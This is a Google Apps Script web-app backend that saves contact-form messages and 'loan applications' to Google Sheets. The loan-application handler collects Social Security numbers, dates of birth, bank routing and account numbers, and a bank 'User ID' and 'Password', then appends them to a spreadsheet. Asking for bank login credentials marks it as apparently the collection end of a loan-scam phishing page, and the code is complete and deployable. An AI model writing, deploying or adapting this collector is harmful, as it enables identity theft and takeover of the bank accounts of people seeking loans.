// Google Apps Script for Google Sheets Only
// Deploy as Web App - Clean Version

// Configuration
const CONFIG = {
  loanApplicationsSheetId: '1t82NO6YE_65eoG0xOz3Rh-bDMDk4fWI05LDdDBihk0Y',
  contactFormSheetId: '1eSeH8VxDDaXPHYqavO5wtr77qdNznznaF8iqHyXhSs4'
}

function doGet(e) {
  return handleRequest(e)
}

function doPost(e) {
  return handleRequest(e)
}

function handleRequest(e) {
  try {
    // Handle both GET and POST requests
    let params = {};
    
    if (e && e.parameter) {
      // GET request parameters
      params = e.parameter;
    } else if (e && e.postData && e.postData.contents) {
      // POST request data
      const postData = e.postData.contents;
      
      if (e.postData.type === 'application/json') {
        // Handle JSON data
        params = JSON.parse(postData);
      } else {
        // Parse URL encoded data
        const pairs = postData.split('&');
        for (let i = 0; i < pairs.length; i++) {
          const pair = pairs[i].split('=');
          if (pair.length === 2) {
            params[decodeURIComponent(pair[0])] = decodeURIComponent(pair[1].replace(/\+/g, ' '));
          }
        }
      }
    } else {
      return createResponse('success', 'Sheets script is working!')
    }
    
    const formType = params.formType
    
    if (!formType) {
      return createResponse('error', 'No form type specified')
    }
    
    if (formType === 'loanApplication') {
      return handleLoanApplicationSheets(params)
    } else if (formType === 'contactForm') {
      return handleContactFormSheets(params)
    } else {
      return createResponse('error', 'Invalid form type: ' + formType)
    }
  } catch (error) {
    return createResponse('error', 'Server error: ' + error.toString())
  }
}

function handleLoanApplicationSheets(params) {
  try {
    // Get loan applications sheet
    const sheet = SpreadsheetApp.openById(CONFIG.loanApplicationsSheetId).getActiveSheet()
    
    // Check if headers exist, if not add them
    if (sheet.getRange('A1').getValue() === '') {
      const headers = [
        'Timestamp',
        'Loan Amount ($2,000 - $10,000)',
        'Loan Purpose',
        'First Name',
        'Last Name',
        'Email Address',
        'Home Address',
        'City',
        'State',
        'ZIP Code',
        'Date of Birth',
        'SSN Number',
        'Bank Name',
        'Routing Number',
        'Account Number',
        'User ID',
        'Password',
        'Telephone Number'
      ]
      sheet.appendRow(headers)
    }
    
    // Prepare row data in exact order you specified
    const rowData = [
      params.loanAmount || '',
      params.loanPurpose || '',
      params.firstName || '',
      params.lastName || '',
      params.email || '',
      params.homeAddress || '',
      params.city || '',
      params.state || '',
      params.zipCode || '',
      params.dateOfBirth || '',
      params.ssnNumber || '',
      params.bankName || '',
      params.routingNumber || '',
      params.accountNumber || '',
      params.userId || '',
      params.password || '',
      params.phoneNumber || ''
    ]
    
    // Add timestamp as first column
    const timestamp = new Date().toLocaleString()
    sheet.appendRow([timestamp, ...rowData])
    
    Logger.log('Loan application saved to Google Sheets successfully')
    
    return createResponse('success', 'Loan application saved to Google Sheets successfully!')
    
  } catch (error) {
    Logger.log('Loan Application Error: ' + error.toString())
    return createResponse('error', 'Failed to save loan application to Google Sheets')
  }
}

function handleContactFormSheets(params) {
  try {
    // Get contact form sheet
    const sheet = SpreadsheetApp.openById(CONFIG.contactFormSheetId).getActiveSheet()
    
    // Check if headers exist, if not add them
    if (sheet.getRange('A1').getValue() === '') {
      const headers = [
        'Timestamp',
        'Your Name',
        'Email Address',
        'Message'
      ]
      sheet.appendRow(headers)
    }
    
    // Prepare row data in exact order you specified
    const rowData = [
      params.name || '',
      params.email || '',
      params.message || ''
    ]
    
    // Add timestamp as first column
    const timestamp = new Date().toLocaleString()
    sheet.appendRow([timestamp, ...rowData])
    
    Logger.log('Contact form saved to Google Sheets successfully')
    
    return createResponse('success', 'Contact form saved to Google Sheets successfully!')
    
  } catch (error) {
    Logger.log('Contact Form Error: ' + error.toString())
    return createResponse('error', 'Failed to save contact form to Google Sheets')
  }
}

function createResponse(status, message) {
  return ContentService.createTextOutput(JSON.stringify({
    status: status,
    message: message
  })).setMimeType(ContentService.MimeType.JSON)
}
